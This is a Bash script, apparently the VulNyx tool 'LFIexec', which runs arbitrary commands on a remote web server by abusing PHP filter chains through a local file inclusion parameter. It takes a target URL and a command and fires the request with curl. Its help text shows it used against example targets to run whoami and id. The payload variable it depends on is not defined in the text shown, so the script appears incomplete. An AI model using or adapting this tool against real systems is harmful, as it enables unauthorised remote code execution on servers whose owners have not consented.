trap ctrl_c INT

function dependencies(){
  which curl &>/dev/null
  if [ "$(echo $?)" != "0" ]; then
    apt install -y curl &>/dev/null
  fi
}

function banner(){
  echo -e "${GREEN}  _     _____ ___ ${RED}                    ${END}"
  echo -e "${GREEN} | |   |  ___|_ _|${RED}  _____  _____  ___ ${END}"
  echo -e "${GREEN} | |   | |_   | | ${RED} / _ \ \/ / _ \/ __|${END}"
  echo -e "${GREEN} | |___|  _|  | | ${RED}|  __/>  <  __/ (__ ${END}"
  echo -e "${GREEN} |_____|_|   |___|${RED} \___/_/\_\___|\___|${END}"
  echo -e "${SEPARATOR}"
  echo -e " code: ${YELLOW}VulNyx‚Ñ¢ ${END}        version: ${YELLOW}v1.0.0${END}"
  echo -e "${SEPARATOR}"
}

function help(){
  echo -e "\n ‚ùì  Usage: LFIexec [OPTIONS]\n"
  echo -e " üåê  Executing commands on a remote system by abusing PHP filter chains in an LFI.\n"
  echo -e " üìã  Options:"
  echo -e "       -t <TARGET>  Specify the target IP/Domain. (includes vulnerable parameter)"
  echo -e "       -c <CMD>     Specify the command to run on the remote system."
  echo -e "       -h           Display this help message and exit.\n"
  echo -e " üí°  Examples:"
  echo -e "       LFIexec -t \"http://192.168.1.2/file.php?file=\" -c whoami"
  echo -e "       LFIexec -t \"http://domain.nyx/item.php?item=\" -c id"
  echo -e "       LFIexec -h \n"
  echo -e "${SEPARATOR}\n"
}

function info(){
  echo -e "üéØ Target   | ${BLUE}${TARGET}${END}"
  echo -e "üíâ Command  | ${YELLOW}${CMD}${END}"
}

function ctrl_c(){
  echo
  tput cnorm
  exit 1
}

function get_request(){
  echo -e "üí• Output   | ‚¨áÔ∏è"
  echo -e "${SEPARATOR}\n"
  OUT=$(curl --output - -sX GET "${TARGET}${PAYLOAD}${CMD}" | head -n -1)
  echo -e "${GREEN}${OUT}${END}"
  echo -e "\n${SEPARATOR}\n"
}

while getopts ":t:c:" ARG; do
  case ${ARG} in
    t) TARGET=$OPTARG; let parameter_counter+=1 ;;
    c) CMD=$OPTARG; let parameter_counter+=1 ;;
  esac
done

if [[ -n "${TARGET}" && -n "${CMD}" ]]; then
  dependencies
  banner
  info
  get_request
  exit 0
else
  banner
  help
  exit 1
fi
